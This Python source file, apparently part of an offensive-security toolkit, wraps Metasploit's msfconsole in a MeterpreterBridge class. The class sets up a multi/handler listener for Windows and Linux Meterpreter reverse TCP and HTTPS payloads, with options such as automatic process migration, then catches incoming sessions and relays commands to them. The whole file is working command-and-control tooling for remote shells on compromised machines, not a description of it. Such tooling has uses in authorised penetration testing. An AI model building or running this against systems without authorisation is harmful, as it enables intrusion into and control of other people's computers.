"""Meterpreter bridge shell engine.

Wrapper around Metasploit Framework's ``msfconsole`` that automates
multi/handler setup, payload generation, and session management.
Requires ``msfconsole`` in PATH.

Author: Andre Henrique (LinkedIn/X: @mrhenrike)
Version: 0.1.0
"""

from __future__ import annotations

import logging
import os
import re
import shutil
import subprocess
import threading
import time
from typing import Dict, List, Optional

from embedxpl.core.shells.shell_engine import (
    ShellConnectionError,
    ShellEngine,
    ShellIOError,
    ShellStatus,
    ShellTimeoutError,
)

logger = logging.getLogger(__name__)

_PROMPT_RE = re.compile(r"(msf\d?\s*(exploit|auxiliary|post)?\s*(\([^)]*\))?\s*>|meterpreter\s*>)", re.IGNORECASE)
_SESSION_RE = re.compile(r"\[\*\]\s*Meterpreter session\s+(\d+)\s+opened", re.IGNORECASE)
_READ_TIMEOUT = 2.0

_SUPPORTED_PAYLOADS: Dict[str, str] = {
    "reverse_tcp": "windows/meterpreter/reverse_tcp",
    "reverse_https": "windows/meterpreter/reverse_https",
    "stageless_tcp": "windows/meterpreter_reverse_tcp",
    "stageless_https": "windows/meterpreter_reverse_https",
    "linux_reverse_tcp": "linux/x86/meterpreter/reverse_tcp",
    "linux_stageless_tcp": "linux/x86/meterpreter_reverse_tcp",
}


class MeterpreterBridge(ShellEngine):
    """Metasploit msfconsole wrapper for multi/handler management.

    Spawns ``msfconsole`` as a subprocess, configures ``exploit/multi/handler``
    with the requested payload, and provides send/recv semantics over the
    msfconsole interactive session.

    Args:
        remote_host: LHOST (attacker's listening IP).
        remote_port: LPORT (listening port).
        payload_key: Key from _SUPPORTED_PAYLOADS or a full Metasploit
                     payload path (e.g. "windows/meterpreter/reverse_tcp").
        timeout: Timeout for msfconsole I/O operations.
        msfconsole_path: Explicit path to msfconsole binary (None = PATH lookup).
        extra_opts: Additional ``set`` options passed to the handler,
                    e.g. {"AutoRunScript": "migrate -f"}.
    """

    def __init__(
        self,
        remote_host: str,
        remote_port: int = 4444,
        payload_key: str = "reverse_tcp",
        timeout: float = 60.0,
        msfconsole_path: Optional[str] = None,
        extra_opts: Optional[Dict[str, str]] = None,
    ) -> None:
        super().__init__(
            remote_host=remote_host,
            remote_port=remote_port,
            transport_type="meterpreter_bridge",
            timeout=timeout,
        )
        self._payload: str = _SUPPORTED_PAYLOADS.get(payload_key, payload_key)
        self._msf_path: str = msfconsole_path or self._find_msfconsole()
        self._extra_opts: Dict[str, str] = extra_opts or {}
        self._proc: Optional[subprocess.Popen] = None
        self._session_id: Optional[int] = None
        self._lock: threading.Lock = threading.Lock()
        self._output_buf: str = ""

    # ------------------------------------------------------------------
    # Connection
    # ------------------------------------------------------------------

    def connect(self) -> bool:
        """Launch msfconsole and configure multi/handler.

        Returns:
            True when the handler is listening.

        Raises:
            ShellConnectionError: If msfconsole fails to start or
                handler configuration errors out.
        """
        self._set_status(ShellStatus.CONNECTING)

        if not os.path.isfile(self._msf_path):
            self._set_status(ShellStatus.ERROR, "msfconsole not found")
            raise ShellConnectionError(
                "msfconsole not found at: {}".format(self._msf_path)
            )

        try:
            self._proc = subprocess.Popen(
                [self._msf_path, "-q", "-x", ""],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                bufsize=0,
            )
        except OSError as exc:
            self._set_status(ShellStatus.ERROR, str(exc))
            raise ShellConnectionError(str(exc)) from exc

        self._wait_for_prompt(timeout=self._timeout)

        handler_cmds = [
            "use exploit/multi/handler",
            "set PAYLOAD {}".format(self._payload),
            "set LHOST {}".format(self._remote_host),
            "set LPORT {}".format(self._remote_port),
            "set ExitOnSession false",
        ]
        for key, value in self._extra_opts.items():
            handler_cmds.append("set {} {}".format(key, value))
        handler_cmds.append("exploit -j -z")

        for cmd in handler_cmds:
            self._write_line(cmd)
            time.sleep(0.3)

        self._wait_for_prompt(timeout=self._timeout)
        self._set_status(ShellStatus.CONNECTED)
        logger.info(
            "Meterpreter handler running: %s on %s:%d",
            self._payload,
            self._remote_host,
            self._remote_port,
        )
        return True

    # ------------------------------------------------------------------
    # I/O
    # ------------------------------------------------------------------

    def send(self, cmd: str) -> int:
        """Send a command to the msfconsole subprocess.

        If a Meterpreter session is active, the command is sent to that
        session; otherwise it goes to the msf console prompt.

        Args:
            cmd: Command string.

        Returns:
            Number of bytes written.

        Raises:
            ShellIOError: If the subprocess is not running.
        """
        self._require_running()
        line = cmd.strip()
        self._write_line(line)
        return len(line.encode("utf-8"))

    def recv(self, timeout: Optional[float] = None) -> str:
        """Read output from the msfconsole subprocess.

        Args:
            timeout: Override default timeout.

        Returns:
            Output text from msfconsole/meterpreter.

        Raises:
            ShellIOError: If the process terminated unexpectedly.
        """
        self._require_running()
        wait = timeout if timeout is not None else _READ_TIMEOUT
        output = self._read_output(wait)

        session_match = _SESSION_RE.search(output)
        if session_match:
            self._session_id = int(session_match.group(1))
            logger.info("Meterpreter session %d opened", self._session_id)

        return output

    # ------------------------------------------------------------------
    # Session helpers
    # ------------------------------------------------------------------

    def interact_session(self, session_id: Optional[int] = None) -> None:
        """Attach to a Meterpreter session.

        Args:
            session_id: Session number. If None, uses the last opened.

        Raises:
            ShellIOError: If no session is available.
        """
        sid = session_id or self._session_id
        if sid is None:
            raise ShellIOError("No Meterpreter session available")
        self.send("sessions -i {}".format(sid))
        time.sleep(0.5)
        logger.info("Attached to session %d", sid)

    def list_sessions(self) -> str:
        """Query active sessions.

        Returns:
            Raw ``sessions -l`` output.
        """
        self.send("sessions -l")
        time.sleep(0.5)
        return self.recv(timeout=3.0)

    @property
    def active_session_id(self) -> Optional[int]:
        """Last detected Meterpreter session ID."""
        return self._session_id

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def close(self) -> None:
        """Terminate the msfconsole subprocess."""
        if self._proc is not None:
            try:
                self._write_line("exit -y")
                self._proc.wait(timeout=10)
            except (OSError, subprocess.TimeoutExpired):
                pass
            try:
                self._proc.kill()
                self._proc.wait(timeout=5)
            except OSError:
                pass
        self._proc = None
        self._session_id = None
        self._set_status(ShellStatus.DISCONNECTED)
        logger.info("MeterpreterBridge closed")

    def is_alive(self) -> bool:
        """Check if the msfconsole process is still running."""
        if self._status != ShellStatus.CONNECTED or self._proc is None:
            return False
        return self._proc.poll() is None

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    @staticmethod
    def _find_msfconsole() -> str:
        """Locate msfconsole in PATH.

        Returns:
            Absolute path to the msfconsole binary.

        Raises:
            ShellConnectionError: If not found.
        """
        path = shutil.which("msfconsole")
        if path is None:
            raise ShellConnectionError(
                "msfconsole not found in PATH; install Metasploit Framework"
            )
        return path

    def _write_line(self, line: str) -> None:
        """Write a line to the subprocess stdin."""
        if self._proc is None or self._proc.stdin is None:
            raise ShellIOError("msfconsole stdin unavailable")
        try:
            self._proc.stdin.write("{}\n".format(line).encode("utf-8"))
            self._proc.stdin.flush()
        except OSError as exc:
            raise ShellIOError("stdin write failed: {}".format(exc)) from exc

    def _read_output(self, timeout: float) -> str:
        """Read available output from stdout within a timeout window."""
        if self._proc is None or self._proc.stdout is None:
            return ""

        buf = []
        deadline = time.monotonic() + timeout

        import select as _sel

        while time.monotonic() < deadline:
            remaining = max(0.01, deadline - time.monotonic())
            try:
                ready, _, _ = _sel.select([self._proc.stdout], [], [], min(remaining, 0.2))
            except (ValueError, OSError):
                break
            if ready:
                try:
                    chunk = self._proc.stdout.read(4096)
                    if chunk:
                        buf.append(chunk.decode("utf-8", errors="replace"))
                    else:
                        break
                except OSError:
                    break
            else:
                if buf:
                    break

        return "".join(buf)

    def _wait_for_prompt(self, timeout: float) -> None:
        """Block until a recognizable msf prompt appears in output."""
        deadline = time.monotonic() + timeout
        accumulated = ""
        while time.monotonic() < deadline:
            chunk = self._read_output(min(1.0, deadline - time.monotonic()))
            accumulated += chunk
            if _PROMPT_RE.search(accumulated):
                return
        logger.warning("Prompt not detected within %.0fs; proceeding", timeout)

    def _require_running(self) -> None:
        if self._proc is None or self._proc.poll() is not None:
            self._set_status(ShellStatus.ERROR, "msfconsole process not running")
            raise ShellIOError("msfconsole process not running")
